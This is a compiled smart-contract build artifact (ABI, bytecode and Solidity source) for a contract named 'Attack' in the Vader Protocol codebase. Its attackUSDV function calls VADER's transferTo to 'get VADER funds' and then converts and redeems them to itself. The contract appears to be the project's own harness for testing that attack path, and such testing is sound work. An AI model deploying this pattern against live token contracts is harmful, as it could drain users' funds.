{
  "contractName": "Attack",
  "abi": [
    {
      "inputs": [],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "USDV",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "VADER",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_vader",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "_USDV",
          "type": "address"
        }
      ],
      "name": "init",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "attackUSDV",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506107cd806100206000396000f3fe608060405234801561001057600080fd5b506004361061004c5760003560e01c80630168131514610051578063c62a1f641461006f578063e2c3b0461461008b578063f09a4016146100a9575b600080fd5b6100596100c5565b60405161006691906106ab565b60405180910390f35b6100896004803603810190610084919061063b565b6100eb565b005b61009361049e565b6040516100a091906106ab565b60405180910390f35b6100c360048036038101906100be91906105d6565b6104c4565b005b600060019054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600060019054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663095ea7b3600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16836040518363ffffffff1660e01b815260040161016a9291906106c6565b602060405180830381600087803b15801561018457600080fd5b505af1158015610198573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101bc9190610612565b50600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663095ea7b3600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16836040518363ffffffff1660e01b815260040161023c9291906106c6565b602060405180830381600087803b15801561025657600080fd5b505af115801561026a573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061028e9190610612565b50600060019054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632ccb1b3030836040518363ffffffff1660e01b81526004016102ec9291906106c6565b602060405180830381600087803b15801561030657600080fd5b505af115801561031a573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061033e9190610612565b50600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a3908e1b826040518263ffffffff1660e01b815260040161039a91906106ef565b602060405180830381600087803b1580156103b457600080fd5b505af11580156103c8573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906103ec9190610664565b50600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663db006a75826040518263ffffffff1660e01b815260040161044891906106ef565b602060405180830381600087803b15801561046257600080fd5b505af1158015610476573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061049a9190610664565b5050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000151560008054906101000a900460ff161515146104e257600080fd5b60016000806101000a81548160ff02191690831515021790555081600060016101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505050565b60008135905061059181610752565b92915050565b6000815190506105a681610769565b92915050565b6000813590506105bb81610780565b92915050565b6000815190506105d081610780565b92915050565b600080604083850312156105e957600080fd5b60006105f785828601610582565b925050602061060885828601610582565b9150509250929050565b60006020828403121561062457600080fd5b600061063284828501610597565b91505092915050565b60006020828403121561064d57600080fd5b600061065b848285016105ac565b91505092915050565b60006020828403121561067657600080fd5b6000610684848285016105c1565b91505092915050565b6106968161070a565b82525050565b6106a581610748565b82525050565b60006020820190506106c0600083018461068d565b92915050565b60006040820190506106db600083018561068d565b6106e8602083018461069c565b9392505050565b6000602082019050610704600083018461069c565b92915050565b600061071582610728565b9050919050565b60008115159050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b61075b8161070a565b811461076657600080fd5b50565b6107728161071c565b811461077d57600080fd5b50565b61078981610748565b811461079457600080fd5b5056fea26469706673582212206ac7649771eda283309dde3148e75f485c894695572a7b93c43930263c496fb164736f6c63430008030033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: UNLICENSED\r\npragma solidity 0.8.3;\r\n\r\n// Interfaces\r\nimport \"./interfaces/iERC20.sol\";\r\nimport \"./interfaces/iVADER.sol\";\r\nimport \"./interfaces/iUSDV.sol\";\r\nimport \"./interfaces/iROUTER.sol\";\r\n\r\n//======================================VADER=========================================//\r\ncontract Attack {\r\n    bool private inited;\r\n    address public VADER;\r\n    address public USDV;\r\n\r\n    //=====================================CREATION=========================================//\r\n    // Constructor\r\n    constructor() {}\r\n\r\n    function init(address _vader, address _USDV) public {\r\n        require(inited == false);\r\n        inited = true;\r\n        VADER = _vader;\r\n        USDV = _USDV;\r\n    }\r\n\r\n    //========================================iERC20=========================================//\r\n    function attackUSDV(uint256 amount) public {\r\n        iERC20(VADER).approve(USDV, amount);\r\n        iERC20(USDV).approve(USDV, amount);\r\n        iERC20(VADER).transferTo(address(this), amount); // get VADER funds\r\n        iUSDV(USDV).convert(amount); // Convert to USDV back to this address\r\n        iUSDV(USDV).redeem(amount); // Burn USDV back to VADER to this address\r\n    }\r\n}\r\n",
  "sourcePath": "E:/Web Workspace/Vader Protocol/vaderprotocol-contracts/contracts/Attack.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.3+commit.8d00100c.Emscripten.clang"
  },
  "schemaVersion": "3.3.4",
  "updatedAt": "2021-04-29T17:43:31.805Z",
  "networkType": "ethereum",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}